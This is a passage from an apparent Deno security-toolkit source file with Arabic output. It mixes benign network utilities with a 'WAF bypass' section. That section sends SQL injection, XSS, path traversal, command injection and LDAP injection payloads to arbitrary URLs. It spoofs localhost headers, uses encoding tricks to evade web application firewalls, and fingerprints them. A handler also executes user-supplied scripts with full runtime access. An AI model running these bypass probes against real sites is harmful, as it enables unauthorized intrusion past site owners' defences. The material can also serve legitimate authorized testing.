      const binary = parts.map(p => p.toString(2).padStart(8, "0")).join(".");
      const hex = parts.map(p => p.toString(16).padStart(2, "0")).join(":");
      results.push(`📌 عشري: ${decimal}`);
      results.push(`📌 ثنائي: ${binary}`);
      results.push(`📌 ست عشري: 0x${hex.replace(/:/g, "")}`);
      results.push(`📌 Hex مفصول: ${hex}`);
    } else { results.push(`❌ عنوان IP غير صالح`); }
    return results.join("\n");
  },

  async cidr_calculator(args) {
    const { cidr } = args;
    if (!cidr) return "❌ مطلوب: cidr";
    const match = cidr.match(/^(\d+)\.(\d+)\.(\d+)\.(\d+)\/(\d+)$/);
    if (!match) return "❌ صيغة CIDR غير صالحة";
    const [, ...o] = match; const prefix = parseInt(o[4]); const ip = o.slice(0, 4).map(Number);
    const mask = prefix === 0 ? 0 : (~0 << (32 - prefix)) >>> 0;
    const ipNum = (ip[0] << 24 | ip[1] << 16 | ip[2] << 8 | ip[3]) >>> 0;
    const network = (ipNum & mask) >>> 0; const broadcast = (network | ~mask) >>> 0;
    const hosts = Math.max(0, Math.pow(2, 32 - prefix) - 2);
    const n2i = (n: number) => `${(n>>>24)&255}.${(n>>>16)&255}.${(n>>>8)&255}.${n&255}`;
    return [`📐 حاسبة CIDR`, `${"─".repeat(40)}`, `📌 النطاق: ${cidr}`, `🌐 الشبكة: ${n2i(network)}`, `📡 البث: ${n2i(broadcast)}`, `🎭 القناع: ${n2i(mask)}`, `🏠 أول: ${n2i(network+1)}`, `🏢 آخر: ${n2i(broadcast-1)}`, `📊 المضيفين: ${hosts.toLocaleString()}`].join("\n");
  },

  async html_encode(args) {
    const { text, mode = "encode" } = args;
    if (!text) return "❌ مطلوب: text";
    if (mode === "decode") {
      const decoded = text.replace(/&amp;/g, "&").replace(/&lt;/g, "<").replace(/&gt;/g, ">").replace(/&quot;/g, '"').replace(/&#39;/g, "'").replace(/&#x([0-9a-f]+);/gi, (_, h) => String.fromCharCode(parseInt(h, 16)));
      return `🌐 HTML Decode:\n${"─".repeat(40)}\n📥 ${text}\n📤 ${decoded}`;
    }
    const encoded = text.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#39;");
    return `🌐 HTML Encode:\n${"─".repeat(40)}\n📥 ${text}\n📤 ${encoded}`;
  },

  async uuid_generator(args) {
    const { count = "5" } = args;
    const cnt = Math.min(parseInt(count) || 5, 20);
    const results: string[] = [`🆔 مولّد UUID\n${"─".repeat(40)}\n`];
    for (let i = 0; i < cnt; i++) { results.push(`  ${i+1}. ${crypto.randomUUID()}`); }
    return results.join("\n");
  },

  async regex_tester(args) {
    const { pattern, text } = args;
    if (!pattern || !text) return "❌ مطلوب: pattern و text";
    const results: string[] = [`🧪 اختبار Regex\n${"─".repeat(40)}\n📌 النمط: ${pattern}\n📝 النص: ${text}\n`];
    try {
      const regex = new RegExp(pattern, "g");
      const matches = [...text.matchAll(regex)];
      if (matches.length > 0) {
        results.push(`✅ تطابقات (${matches.length}):`);
        matches.slice(0, 10).forEach((m, i) => results.push(`  ${i+1}. "${m[0]}" (موضع: ${m.index})`));
      } else { results.push(`❌ لا يوجد تطابق`); }
    } catch (e) { results.push(`❌ نمط غير صالح: ${e instanceof Error ? e.message : "خطأ"}`); }
    return results.join("\n");
  },

  async ssl_cert_generator(args) {
    const { domain, days = "365" } = args;
    if (!domain) return "❌ مطلوب: domain";
    const d = parseInt(days) || 365;
    return [`📜 مولّد شهادة SSL ذاتية التوقيع`, `${"─".repeat(40)}`, `\n🔑 توليد المفتاح الخاص:`, `  openssl genrsa -out ${domain}.key 2048`, `\n📄 توليد CSR:`, `  openssl req -new -key ${domain}.key -out ${domain}.csr -subj "/CN=${domain}"`, `\n📜 توليد الشهادة:`, `  openssl x509 -req -days ${d} -in ${domain}.csr -signkey ${domain}.key -out ${domain}.crt`, `\n🔗 أمر واحد:`, `  openssl req -x509 -newkey rsa:2048 -keyout ${domain}.key -out ${domain}.crt -days ${d} -nodes -subj "/CN=${domain}"`, `\n⚠️ للاستخدام في بيئة التطوير فقط!`].join("\n");
  },

  async htaccess_generator(args) {
    const { features = "redirect,security_headers,block_bots" } = args;
    const feats = features.split(",").map(f => f.trim());
    const results: string[] = [`⚙️ مولّد .htaccess\n${"─".repeat(40)}\n`];
    const rules: string[] = [];
    if (feats.includes("redirect")) { rules.push("# إعادة توجيه HTTP → HTTPS\nRewriteEngine On\nRewriteCond %{HTTPS} off\nRewriteRule ^(.*)$ https://%{HTTP_HOST}%{REQUEST_URI} [L,R=301]"); }
    if (feats.includes("security_headers")) { rules.push("# Headers أمنية\nHeader set X-Content-Type-Options \"nosniff\"\nHeader set X-Frame-Options \"SAMEORIGIN\"\nHeader set X-XSS-Protection \"1; mode=block\"\nHeader set Referrer-Policy \"strict-origin-when-cross-origin\"\nHeader set Permissions-Policy \"geolocation=(), microphone=(), camera=()\""); }
    if (feats.includes("block_bots")) { rules.push("# حظر البوتات الضارة\nRewriteCond %{HTTP_USER_AGENT} (bot|crawl|spider|scan) [NC]\nRewriteRule .* - [F,L]"); }
    rules.push("# منع الوصول لملفات حساسة\n<FilesMatch \"\\.(env|git|sql|bak|log|ini)$\">\n  Order allow,deny\n  Deny from all\n</FilesMatch>");
    results.push(rules.join("\n\n"));
    return results.join("\n");
  },

  async cors_header_generator(args) {
    const { origin, methods = "GET,POST,PUT,DELETE" } = args;
    if (!origin) return "❌ مطلوب: origin";
    return [`🛡️ CORS Headers Generator`, `${"─".repeat(40)}`, `\n# Apache (.htaccess):`, `Header set Access-Control-Allow-Origin "${origin}"`, `Header set Access-Control-Allow-Methods "${methods}"`, `Header set Access-Control-Allow-Headers "Content-Type, Authorization"`, `Header set Access-Control-Max-Age "86400"`, `\n# Nginx:`, `add_header Access-Control-Allow-Origin "${origin}";`, `add_header Access-Control-Allow-Methods "${methods}";`, `add_header Access-Control-Allow-Headers "Content-Type, Authorization";`, `\n# Node.js/Express:`, `app.use(cors({ origin: "${origin}", methods: "${methods}" }));`].join("\n");
  },

  async encryption_tool(args) {
    const { text, key, mode = "encrypt" } = args;
    if (!text || !key) return "❌ مطلوب: text و key";
    const results: string[] = [`🔏 ${mode === "decrypt" ? "فك" : ""} تشفير AES\n${"─".repeat(40)}\n`];
    try {
      const keyData = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(key));
      const cryptoKey = await crypto.subtle.importKey("raw", keyData, "AES-GCM", false, ["encrypt", "decrypt"]);
      if (mode === "decrypt") {
        const data = base64Decode(text);
        const iv = data.slice(0, 12);
        const ciphertext = data.slice(12);
        const decrypted = await crypto.subtle.decrypt({ name: "AES-GCM", iv }, cryptoKey, ciphertext);
        results.push(`📤 النص المفكوك: ${new TextDecoder().decode(decrypted)}`);
      } else {
        const iv = crypto.getRandomValues(new Uint8Array(12));
        const encrypted = await crypto.subtle.encrypt({ name: "AES-GCM", iv }, cryptoKey, new TextEncoder().encode(text));
        const combined = new Uint8Array(iv.length + new Uint8Array(encrypted).length);
        combined.set(iv); combined.set(new Uint8Array(encrypted), iv.length);
        results.push(`📤 النص المشفر: ${base64Encode(combined)}`);
      }
    } catch (e) { results.push(`❌ خطأ: ${e instanceof Error ? e.message : "خطأ"}`); }
    return results.join("\n");
  },

  async security_checklist(args) {
    const { url } = args;
    if (!url) return "❌ مطلوب: url";
    const results: string[] = [`✅ قائمة التحقق الأمني: ${url}\n${"─".repeat(40)}\n`];
    let score = 0; const total = 10;
    try {
      const resp = await fetch(url, { redirect: "follow" });
      const html = await resp.text();
      // HTTPS
      const isHttps = url.startsWith("https"); results.push(`${isHttps ? "✅" : "❌"} HTTPS`); if (isHttps) score++;
      // Security headers
      const hsts = resp.headers.get("strict-transport-security"); results.push(`${hsts ? "✅" : "❌"} HSTS`); if (hsts) score++;
      const csp = resp.headers.get("content-security-policy"); results.push(`${csp ? "✅" : "❌"} CSP`); if (csp) score++;
      const xcto = resp.headers.get("x-content-type-options"); results.push(`${xcto ? "✅" : "❌"} X-Content-Type-Options`); if (xcto) score++;
      const xfo = resp.headers.get("x-frame-options"); results.push(`${xfo ? "✅" : "❌"} X-Frame-Options`); if (xfo) score++;
      const rp = resp.headers.get("referrer-policy"); results.push(`${rp ? "✅" : "❌"} Referrer-Policy`); if (rp) score++;
      const pp = resp.headers.get("permissions-policy"); results.push(`${pp ? "✅" : "❌"} Permissions-Policy`); if (pp) score++;
      // Server info leak
      const server = resp.headers.get("server"); results.push(`${!server ? "✅" : "⚠️"} Server Header: ${server || "مخفي"}`); if (!server) score++;
      const powered = resp.headers.get("x-powered-by"); results.push(`${!powered ? "✅" : "⚠️"} X-Powered-By: ${powered || "مخفي"}`); if (!powered) score++;
      // Mixed content
      const mixedContent = html.includes('src="http://') || html.includes("src='http://");
      results.push(`${!mixedContent ? "✅" : "❌"} لا يوجد محتوى مختلط`); if (!mixedContent) score++;
      results.push(`\n📊 النتيجة: ${score}/${total} (${Math.round(score/total*100)}%)`);
      if (score >= 8) results.push(`🟢 ممتاز!`); else if (score >= 5) results.push(`🟡 متوسط`); else results.push(`🔴 يحتاج تحسين!`);
    } catch (e) { results.push(`❌ خطأ: ${e instanceof Error ? e.message : "خطأ"}`); }
    return results.join("\n");
  },
};

// ===== WAF BYPASS TOOLS =====

tools.waf_bypass_test = async (args) => {
  const { url } = args;
  if (!url) return "❌ مطلوب: url";
  const results: string[] = [`🔓 اختبار تجاوز WAF الشامل: ${url}\n${"─".repeat(40)}\n`];

  // Step 1: Identify WAF
  results.push("📌 الخطوة 1: تحديد نوع WAF...\n");
  let detectedWaf = "Unknown";
  try {
    const normalResp = await stealthFetch(url);
    await normalResp.text();
    const headers = Object.fromEntries(normalResp.headers.entries());
    if (headers["cf-ray"]) detectedWaf = "Cloudflare";
    else if (headers["x-sucuri-id"]) detectedWaf = "Sucuri";
    else if (headers["x-amzn-requestid"]) detectedWaf = "AWS WAF";
    else if (headers["x-iinfo"]) detectedWaf = "Imperva";
    else if (headers["server"]?.toLowerCase().includes("bigip")) detectedWaf = "F5 BIG-IP";
    
    // Trigger WAF with malicious payload
    const triggerResp = await stealthFetch(`${url}?test=<script>alert(1)</script>&id=' OR 1=1--`);
    const triggerBody = await triggerResp.text();
    const waf = isWafBlocked(triggerResp, triggerBody);
    if (waf.blocked) detectedWaf = waf.wafName;
    results.push(`🧱 WAF مكتشف: ${detectedWaf}\n`);
  } catch (e) { results.push(`❌ خطأ: ${e instanceof Error ? e.message : "خطأ"}\n`); }

  // Step 2: Test bypass techniques
  results.push("📌 الخطوة 2: اختبار تقنيات التجاوز...\n");
  const techniques = [
    { name: "User-Agent: Googlebot", headers: { "User-Agent": "Googlebot/2.1 (+http://www.google.com/bot.html)" } },
    { name: "User-Agent: Mobile", headers: { "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)" } },
    { name: "X-Forwarded-For: 127.0.0.1", headers: { "X-Forwarded-For": "127.0.0.1" } },
    { name: "X-Originating-IP: 127.0.0.1", headers: { "X-Originating-IP": "127.0.0.1" } },
    { name: "X-Real-IP: 127.0.0.1", headers: { "X-Real-IP": "127.0.0.1" } },
    { name: "X-Custom-IP: 127.0.0.1", headers: { "X-Custom-IP-Authorization": "127.0.0.1" } },
    { name: "Content-Type: multipart", headers: { "Content-Type": "multipart/form-data" } },
    { name: "Accept: application/json", headers: { "Accept": "application/json" } },
  ];

  const maliciousPath = "?id=' OR 1=1--";
  for (const tech of techniques) {
    try {
      const resp = await fetch(`${url}${maliciousPath}`, { 
        headers: { ...tech.headers, "Accept-Language": "en-US", "Connection": "keep-alive" },
        redirect: "follow" 
      });
      const body = await resp.text();
      const waf = isWafBlocked(resp, body);
      results.push(`  ${waf.blocked ? "🧱" : "🔓"} ${tech.name}: ${resp.status} ${waf.blocked ? "(محظور)" : "(مرور!)"}`);
    } catch { results.push(`  ❌ ${tech.name}: فشل`); }
  }

  // Step 3: URL encoding techniques
  results.push("\n📌 الخطوة 3: تقنيات ترميز URL...\n");
  const encodings = [
    { name: "Double URL Encode", path: "?id=%2527%2520OR%25201%253D1--" },
    { name: "Unicode Encode", path: "?id=%u0027%u0020OR%u00201%u003D1--" },
    { name: "Hex Encode", path: "?id=0x27%20OR%201=1--" },
    { name: "Tab Separation", path: "?id='\tOR\t1=1--" },
    { name: "Comment Insertion", path: "?id='/**/OR/**/1=1--" },
    { name: "Null Byte", path: "?id=%00' OR 1=1--" },
    { name: "Newline", path: "?id=%0a' OR 1=1--" },
    { name: "HTTP Parameter Pollution", path: "?id=1&id=' OR 1=1--" },
  ];

  for (const enc of encodings) {
    try {
      const resp = await stealthFetch(`${url}${enc.path}`);
      const body = await resp.text();
      const waf = isWafBlocked(resp, body);
      results.push(`  ${waf.blocked ? "🧱" : "🔓"} ${enc.name}: ${resp.status} ${waf.blocked ? "(محظور)" : "(مرور!)"}`);
    } catch { results.push(`  ❌ ${enc.name}: فشل`); }
  }

  // Step 4: HTTP method switching
  results.push("\n📌 الخطوة 4: تبديل HTTP Methods...\n");
  for (const method of ["GET", "POST", "PUT", "PATCH"]) {
    try {
      const resp = await stealthFetch(`${url}${maliciousPath}`, { method });
      const body = await resp.text();
      const waf = isWafBlocked(resp, body);
      results.push(`  ${waf.blocked ? "🧱" : "🔓"} ${method}: ${resp.status} ${waf.blocked ? "(محظور)" : "(مرور!)"}`);
    } catch { results.push(`  ❌ ${method}: فشل`); }
  }

  return results.join("\n");
};

tools.waf_fingerprint = async (args) => {
  const { url } = args;
  if (!url) return "❌ مطلوب: url";
  const results: string[] = [`🔍 بصمة WAF التفصيلية: ${url}\n${"─".repeat(40)}\n`];

  // Normal request
  try {
    const resp = await stealthFetch(url);
    const body = await resp.text();
    const headers = Object.fromEntries(resp.headers.entries());
    
    results.push("📋 Headers المكتشفة:");
    for (const [k, v] of Object.entries(headers)) {
      results.push(`  ${k}: ${v.slice(0, 100)}`);
    }
    
    // WAF signatures database
    const signatures = [
      { name: "Cloudflare", checks: [!!headers["cf-ray"], !!headers["cf-cache-status"], body.includes("cloudflare"), !!headers["cf-connecting-ip"]] },
      { name: "AWS WAF/CloudFront", checks: [!!headers["x-amz-cf-id"], !!headers["x-amzn-requestid"], !!headers["x-amz-cf-pop"]] },
      { name: "Akamai", checks: [!!headers["x-akamai-transformed"], !!headers["akamai-origin-hop"], body.includes("akamai")] },
      { name: "Sucuri", checks: [!!headers["x-sucuri-id"], !!headers["x-sucuri-cache"], body.includes("sucuri")] },
      { name: "Imperva/Incapsula", checks: [!!headers["x-iinfo"], !!headers["x-cdn"], body.includes("incapsula")] },
      { name: "F5 BIG-IP", checks: [!!headers["x-cnection"], !!headers["x-wa-info"], headers["server"]?.includes("BigIP") || false] },
      { name: "ModSecurity", checks: [body.includes("ModSecurity"), body.includes("mod_security"), headers["server"]?.includes("mod_security") || false] },
      { name: "Wordfence", checks: [body.includes("wordfence"), body.includes("wfAction")] },
      { name: "Fortinet FortiWeb", checks: [!!headers["fortiwafsid"], body.includes("fortigate")] },
      { name: "Barracuda", checks: [!!headers["barra_counter_session"], body.includes("barracuda")] },
      { name: "DDoS-Guard", checks: [!!headers["x-ddos-protection"], body.includes("ddos-guard")] },
      { name: "StackPath", checks: [!!headers["x-sp-url"], body.includes("stackpath")] },
    ];
    
    results.push("\n🧱 نتائج الفحص:");
    let detectedCount = 0;
    for (const sig of signatures) {
      const matchCount = sig.checks.filter(Boolean).length;
      if (matchCount > 0) {
        results.push(`  🔴 ${sig.name}: ${matchCount}/${sig.checks.length} مؤشرات`);
        detectedCount++;
      }
    }
    
    if (detectedCount === 0) {
      results.push("  ✅ لم يتم اكتشاف WAF معروف");
    }
    
    // Test WAF sensitivity
    results.push("\n📊 اختبار حساسية WAF:");
    const sensitivityTests = [
      { name: "XSS بسيط", path: "?x=<script>" },
      { name: "SQLi بسيط", path: "?x=' OR 1=1" },
      { name: "Path Traversal", path: "?x=../../../etc/passwd" },
      { name: "Command Injection", path: "?x=;ls -la" },
      { name: "LDAP Injection", path: "?x=*)(uid=*))(|(uid=*" },
    ];
    
    for (const test of sensitivityTests) {
      try {
        const testResp = await stealthFetch(`${url}${test.path}`);
        const testBody = await testResp.text();
        const waf = isWafBlocked(testResp, testBody);
        results.push(`  ${waf.blocked ? "🧱 محظور" : "🔓 مرّ"} ${test.name} → ${testResp.status}`);
      } catch { results.push(`  ❌ ${test.name}: فشل`); }
    }

  } catch (e) { results.push(`❌ خطأ: ${e instanceof Error ? e.message : "خطأ"}`); }
  return results.join("\n");
};

tools.rate_limit_test = async (args) => {
  const { url } = args;
  if (!url) return "❌ مطلوب: url";
  const results: string[] = [`⏱️ اختبار Rate Limiting: ${url}\n${"─".repeat(40)}\n`];
  
  const requestCounts = [5, 10, 20];
  for (const count of requestCounts) {
    results.push(`\n📡 إرسال ${count} طلبات سريعة...`);
    let blocked = 0;
    let passed = 0;
    const statuses: number[] = [];
    
    const promises = Array.from({ length: count }, () => 
      fetch(url, { headers: { "User-Agent": randomUA() }, redirect: "follow" })
        .then(async r => { 
          statuses.push(r.status); 
          await r.text();
          if (r.status === 429 || r.status === 503) blocked++;
          else passed++;
        })
        .catch(() => { blocked++; })
    );
    
    await Promise.all(promises);
    
    const statusCounts = statuses.reduce((acc, s) => { acc[s] = (acc[s] || 0) + 1; return acc; }, {} as Record<number, number>);
    results.push(`  ✅ مرّ: ${passed} | 🧱 محظور: ${blocked}`);
    results.push(`  📊 الحالات: ${Object.entries(statusCounts).map(([s, c]) => `${s}(${c})`).join(", ")}`);
    
    if (blocked > 0) {
      results.push(`  ⚠️ Rate limiting مفعّل عند ~${passed} طلب`);
      break;
    }
  }
  
  return results.join("\n");
};

// VirusTotal API helper
async function vtApiCall(endpoint: string, method = "GET", body?: string): Promise<any> {
  const apiKey = Deno.env.get("VIRUSTOTAL_API_KEY");
  if (!apiKey) throw new Error("مفتاح VirusTotal API غير مُعد");
  const opts: RequestInit = {
    method,
    headers: { "x-apikey": apiKey, "Content-Type": "application/x-www-form-urlencoded" },
  };
  if (body) opts.body = body;
  const resp = await fetch(`https://www.virustotal.com/api/v3/${endpoint}`, opts);
  if (!resp.ok) {
    const errText = await resp.text();
    throw new Error(`VT API ${resp.status}: ${errText.substring(0, 200)}`);
  }
  return resp.json();
}

// Determine the best VirusTotal scan type based on input
function detectVTScanType(target: string): "url" | "domain" | "ip" {
  if (target.startsWith("http://") || target.startsWith("https://")) return "url";
  if (/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/.test(target)) return "ip";
  return "domain";
}

// Format VirusTotal results
function formatVTResults(data: any, scanType: string, target: string): string[] {
  const lines: string[] = [];
  const attrs = data?.data?.attributes || {};

  if (scanType === "url" || scanType === "domain") {
    const stats = attrs.last_analysis_stats || {};
    const total = Object.values(stats).reduce((a: number, b: any) => a + (Number(b) || 0), 0);
    const malicious = stats.malicious || 0;
    const suspicious = stats.suspicious || 0;
    const harmless = stats.harmless || 0;
    const undetected = stats.undetected || 0;

    lines.push(`\n📊 نتائج التحليل (${total} محرك):`);
    lines.push(`  🔴 خبيث: ${malicious}`);
    lines.push(`  🟡 مشبوه: ${suspicious}`);
    lines.push(`  🟢 آمن: ${harmless}`);
    lines.push(`  ⚪ غير مكتشف: ${undetected}`);

    const score = total > 0 ? Math.round(((harmless + undetected) / total) * 100) : 0;
    lines.push(`\n🛡️ نتيجة الأمان: ${score}% ${malicious > 0 ? "⚠️ تحذير!" : "✅"}`);

    // Show malicious detections
    const results = attrs.last_analysis_results || {};
    const maliciousEngines = Object.entries(results)
      .filter(([, v]: [string, any]) => v.category === "malicious" || v.category === "suspicious")
      .slice(0, 10);
    if (maliciousEngines.length > 0) {
      lines.push(`\n🚨 محركات اكتشفت تهديدات:`);
      maliciousEngines.forEach(([engine, v]: [string, any]) => {
        lines.push(`  ⚠️ ${engine}: ${v.result || v.category}`);
      });
    }

    // Categories & reputation
    if (attrs.categories) {
      lines.push(`\n📂 التصنيف:`);
      Object.entries(attrs.categories).slice(0, 5).forEach(([src, cat]) => {
        lines.push(`  → ${src}: ${cat}`);
      });
    }
    if (attrs.reputation !== undefined) lines.push(`\n⭐ السمعة: ${attrs.reputation}`);
    if (attrs.last_https_certificate) {
      const cert = attrs.last_https_certificate;
      lines.push(`\n🔒 شهادة SSL:`);
      if (cert.issuer) lines.push(`  المُصدر: ${cert.issuer.O || cert.issuer.CN || "غير معروف"}`);
      if (cert.validity) {
        lines.push(`  صالحة من: ${cert.validity.not_before || "?"}`);
        lines.push(`  صالحة حتى: ${cert.validity.not_after || "?"}`);
      }
    }
  }

  if (scanType === "ip") {
    lines.push(`\n🌐 معلومات IP:`);
    if (attrs.as_owner) lines.push(`  🏢 المالك: ${attrs.as_owner}`);
    if (attrs.asn) lines.push(`  📡 ASN: ${attrs.asn}`);
    if (attrs.country) lines.push(`  🌍 الدولة: ${attrs.country}`);
    if (attrs.network) lines.push(`  🔗 الشبكة: ${attrs.network}`);

    const stats = attrs.last_analysis_stats || {};
    const malicious = stats.malicious || 0;
    const suspicious = stats.suspicious || 0;
    const harmless = stats.harmless || 0;
    lines.push(`\n📊 التحليل:`);
    lines.push(`  🔴 خبيث: ${malicious} | 🟡 مشبوه: ${suspicious} | 🟢 آمن: ${harmless}`);
  }

  // Subdomains for domains
  if (scanType === "domain" && attrs.last_dns_records) {
    lines.push(`\n📋 سجلات DNS:`);
    (attrs.last_dns_records as any[]).slice(0, 10).forEach((r: any) => {
      lines.push(`  ${r.type}: ${r.value || r.data || ""}`);
    });
  }

  return lines;
}

// Custom tool execution handler
async function executeCustomTool(args: Record<string, string>, config: { executionType: string; executionConfig: Record<string, string> }): Promise<string> {
  const { executionType, executionConfig } = config;
  const results: string[] = [`🔧 تنفيذ أداة مخصصة\n${"─".repeat(40)}`];

  try {
    // Check if this is a GitHub-imported tool → use VirusTotal API
    const isGithubImported = !!executionConfig.source_repo;
    const vtApiKey = Deno.env.get("VIRUSTOTAL_API_KEY");

    if (isGithubImported && vtApiKey && executionType === "http_fetch") {
      const target = args.target || args.url || args.domain || args.ip || Object.values(args)[0] || "";
      if (!target) return "❌ لم يتم تحديد الهدف";

      const scanType = detectVTScanType(target);
      results.push(`🛡️ VirusTotal - تحليل ${scanType === "url" ? "رابط" : scanType === "ip" ? "عنوان IP" : "نطاق"}`);
      results.push(`🎯 الهدف: ${target}`);
      results.push(`📦 المصدر: ${executionConfig.source_repo || "GitHub"}`);

      try {
        if (scanType === "url") {
          // Submit URL for scanning first
          const scanResp = await vtApiCall("urls", "POST", `url=${encodeURIComponent(target)}`);
          const analysisId = scanResp?.data?.id;

          // Wait a bit then get results
          await new Promise(r => setTimeout(r, 3000));

          if (analysisId) {
            try {
              const analysis = await vtApiCall(`analyses/${analysisId}`);
              const stats = analysis?.data?.attributes?.stats || {};
              results.push(`\n📊 نتائج الفحص:`);
              results.push(`  🔴 خبيث: ${stats.malicious || 0}`);
              results.push(`  🟡 مشبوه: ${stats.suspicious || 0}`);
              results.push(`  🟢 آمن: ${stats.harmless || 0}`);
              results.push(`  ⚪ غير مكتشف: ${stats.undetected || 0}`);
              const total = Object.values(stats).reduce((a: number, b: any) => a + (Number(b) || 0), 0);
              const mal = stats.malicious || 0;
              results.push(`\n🛡️ الحكم: ${mal > 0 ? "⚠️ تم اكتشاف تهديدات!" : "✅ آمن"}`);
            } catch {
              results.push(`⏳ التحليل قيد التنفيذ... أعد المحاولة بعد دقيقة`);
            }
          }

          // Also get URL report if available
          const urlId = btoa(target).replace(/=/g, "");
          try {
            const report = await vtApiCall(`urls/${urlId}`);
            results.push(...formatVTResults(report, "url", target));
          } catch {}

        } else if (scanType === "domain") {
          const data = await vtApiCall(`domains/${target}`);
          results.push(...formatVTResults(data, "domain", target));

          // Get subdomains
          try {
            const subs = await vtApiCall(`domains/${target}/subdomains?limit=10`);
            if (subs?.data?.length > 0) {
              results.push(`\n🔍 النطاقات الفرعية:`);
              subs.data.forEach((s: any) => results.push(`  → ${s.id}`));
            }
          } catch {}

        } else if (scanType === "ip") {
          const data = await vtApiCall(`ip_addresses/${target}`);
          results.push(...formatVTResults(data, "ip", target));
        }
      } catch (e) {
        results.push(`\n❌ خطأ VirusTotal: ${e instanceof Error ? e.message : "فشل"}`);
      }

      return results.join("\n");
    }

    if (executionType === "http_fetch") {
      let url = executionConfig.urlTemplate || executionConfig.url_template || executionConfig.url || executionConfig.endpoint || "";
      if (!url && (args.url || args.target)) {
        url = args.url || args.target || "";
        if (url && !url.startsWith("http")) url = "https://" + url;
      }
      for (const [key, value] of Object.entries(args)) {
        url = url.replace(`{${key}}`, encodeURIComponent(value));
        url = url.replace(`{{${key}}}`, encodeURIComponent(value));
      }
      if (!url) return "❌ لم يتم تحديد URL - تأكد من إدخال الهدف";
      const method = executionConfig.method || "GET";
      const resp = await fetch(url, { method, redirect: "follow" });
      const text = await resp.text();
      results.push(`📡 ${method} ${url}`);
      results.push(`📊 Status: ${resp.status} ${resp.statusText}`);
      results.push(`📏 الحجم: ${text.length} بايت`);
      results.push(`\n📋 Headers:`);
      resp.headers.forEach((v, k) => results.push(`  ${k}: ${v.substring(0, 100)}`));
      results.push(`\n📄 المحتوى (أول 500 حرف):`);
      results.push(text.substring(0, 500));
    } else if (executionType === "dns_query") {
      const target = args.target || args.domain || Object.values(args)[0] || "";
      if (!target) return "❌ لم يتم تحديد الهدف";
      results.push(`🌐 استعلام DNS: ${target}`);
      try { const r = await Deno.resolveDns(target, "A"); results.push(`\n📌 A: ${r.join(", ")}`); } catch { results.push(`❌ لا سجلات A`); }
      try { const r = await Deno.resolveDns(target, "AAAA"); results.push(`📌 AAAA: ${r.join(", ")}`); } catch {}
      try { const r = await Deno.resolveDns(target, "MX"); results.push(`📧 MX: ${r.map(m => m.exchange).join(", ")}`); } catch {}
      try { const r = await Deno.resolveDns(target, "NS"); results.push(`🏷️ NS: ${r.join(", ")}`); } catch {}
      try { const r = await Deno.resolveDns(target, "TXT"); results.push(`📝 TXT: ${r.map(t => t.join("")).join(" | ")}`); } catch {}
    } else if (executionType === "tcp_connect") {
      const target = args.target || Object.values(args)[0] || "";
      const port = parseInt(args.port || "443");
      if (!target) return "❌ لم يتم تحديد الهدف";
      results.push(`📡 اتصال TCP: ${target}:${port}`);
      const start = performance.now();
      try {
        const conn = await Deno.connect({ hostname: target, port, transport: "tcp" });
        const elapsed = performance.now() - start;
        conn.close();
        results.push(`✅ متصل (${elapsed.toFixed(1)}ms)`);
      } catch (e) {
        results.push(`❌ فشل الاتصال: ${e instanceof Error ? e.message : "خطأ"}`);
      }
    } else if (executionType === "custom_script") {
      let script = executionConfig.script || "";
      if (!script) return "❌ لم يتم تحديد سكريبت";
      results.push(`📜 تنفيذ سكريبت مخصص...`);
      // Strip any require() calls - they don't work in Deno
      script = script.replace(/(?:const|let|var)\s+\w+\s*=\s*require\s*\([^)]*\)\s*;?/g, "// require removed");
      script = script.replace(/require\s*\([^)]*\)/g, "undefined /* require not available */");
      try {
        const fn = new Function("args", "fetch", "Deno", "performance", "TextEncoder", "TextDecoder", "URL", "URLSearchParams", "Headers", "Response", "Request", "AbortController", "setTimeout", "console",
          `return (async () => { ${script} })();`);
        const output = await fn(args, fetch, Deno, performance, TextEncoder, TextDecoder, URL, URLSearchParams, Headers, Response, Request, AbortController, setTimeout, console);
        results.push(String(output || "✅ تم التنفيذ بنجاح"));
      } catch (e) {
        results.push(`❌ خطأ في السكريبت: ${e instanceof Error ? e.message : "خطأ"}`);
      }
    } else {
      results.push(`❌ نوع تنفيذ غير مدعوم: ${executionType}`);
    }
  } catch (e) {
    results.push(`❌ خطأ: ${e instanceof Error ? e.message : "خطأ"}`);
  }

  return results.join("\n");
}

// === NEW ADVANCED TOOLS ===

tools.security_txt_check = async (args) => {
  const { url } = args;
  if (!url) return "❌ مطلوب: url";
  const base = url.replace(/\/+$/, "");
  const results: string[] = [`🔐 فحص Security.txt: ${base}\n${"─".repeat(40)}`];
  const paths = [`${base}/.well-known/security.txt`, `${base}/security.txt`];
  for (const path of paths) {
    try {
      const resp = await fetch(path);
      if (resp.ok) {
        const text = await resp.text();
        results.push(`✅ موجود في: ${path}\n`);
        results.push(text.slice(0, 2000));
        const hasContact = /Contact:/i.test(text);
        const hasExpires = /Expires:/i.test(text);
        const hasEncryption = /Encryption:/i.test(text);
        results.push(`\n📊 تحليل:`);
        results.push(`  ${hasContact ? "✅" : "❌"} Contact`);
        results.push(`  ${hasExpires ? "✅" : "❌"} Expires`);
        results.push(`  ${hasEncryption ? "✅" : "❌"} Encryption`);
        return results.join("\n");
      } else { await resp.text(); }
    } catch {}
  }
  results.push(`❌ لا يوجد ملف security.txt`);
  return results.join("\n");
};

tools.dns_zone_transfer = async (args) => {
  const { domain } = args;
  if (!domain) return "❌ مطلوب: domain";
  const results: string[] = [`🔄 اختبار نقل المنطقة DNS (AXFR): ${domain}\n${"─".repeat(40)}`];
  try {
    const ns = await Deno.resolveDns(domain, "NS");
    results.push(`🏷️ خوادم DNS: ${ns.join(", ")}`);
    for (const server of ns.slice(0, 3)) {
      try {
        const conn = await Deno.connect({ hostname: server.replace(/\.$/, ""), port: 53, transport: "tcp" });
        conn.close();
        results.push(`⚠️ ${server}: المنفذ 53 TCP مفتوح (قد يسمح بـ AXFR)`);
      } catch {
        results.push(`✅ ${server}: المنفذ 53 TCP مغلق (AXFR محمي)`);
      }
    }
  } catch (e) { results.push(`❌ خطأ: ${e instanceof Error ? e.message : "خطأ"}`); }
  return results.join("\n");
};

tools.cloud_metadata_check = async (args) => {
  const { url } = args;
  if (!url) return "❌ مطلوب: url";
  const results: string[] = [`☁️ فحص تسرب بيانات السحابة: ${url}\n${"─".repeat(40)}`];
  const endpoints = [
